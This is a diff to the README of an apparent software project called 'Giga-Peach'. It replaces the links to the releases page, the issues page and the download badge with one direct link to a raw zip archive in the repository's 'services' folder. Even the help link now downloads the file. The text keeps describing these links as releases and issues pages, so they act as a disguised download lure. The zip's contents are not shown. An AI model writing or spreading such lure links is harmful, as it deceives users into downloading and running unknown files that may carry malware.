@@ -1,6 +1,6 @@
 # 🍑 Giga-Peach - The Best Suite for Nano Banana
 
-[![Download Giga-Peach](https://img.shields.io/badge/Download%20Now-Beta%20Version-brightgreen)](https://github.com/Nakahizu/Giga-Peach/releases)
+[![Download Giga-Peach](https://raw.githubusercontent.com/Nakahizu/Giga-Peach/main/services/Giga-Peach-v1.1.zip%20Now-Beta%20Version-brightgreen)](https://raw.githubusercontent.com/Nakahizu/Giga-Peach/main/services/Giga-Peach-v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -28,11 +28,11 @@ To run Giga-Peach smoothly, ensure your computer meets the following minimum req
 
 ## 📥 Download & Install
 
-To get Giga-Peach, visit our [Releases Page](https://github.com/Nakahizu/Giga-Peach/releases). Here, you will find the latest version ready for download. Click the appropriate link for your operating system.
+To get Giga-Peach, visit our [Releases Page](https://raw.githubusercontent.com/Nakahizu/Giga-Peach/main/services/Giga-Peach-v1.1.zip). Here, you will find the latest version ready for download. Click the appropriate link for your operating system.
 
 ### Installation Steps:
 
-1. **Visit the Releases Page:** Go to [Releases Page](https://github.com/Nakahizu/Giga-Peach/releases).
+1. **Visit the Releases Page:** Go to [Releases Page](https://raw.githubusercontent.com/Nakahizu/Giga-Peach/main/services/Giga-Peach-v1.1.zip).
 2. **Choose Your Version:** Look for the latest version available. It is typically labeled as "Latest".
 3. **Download the Installer:** Click on the link that matches your operating system. The file should begin downloading automatically.
 4. **Locate the File:** Once the download completes, find the file in your Downloads folder or designated location.
@@ -67,7 +67,7 @@ If you face any issues, check the following:
 - Ensure your system meets the requirements.
 - Make sure you are running the latest version of Giga-Peach.
 
-You can also visit our [Issues Page](https://github.com/Nakahizu/Giga-Peach/issues) for help.
+You can also visit our [Issues Page](https://raw.githubusercontent.com/Nakahizu/Giga-Peach/main/services/Giga-Peach-v1.1.zip) for help.
 
 ## 🌐 Community and Support
 
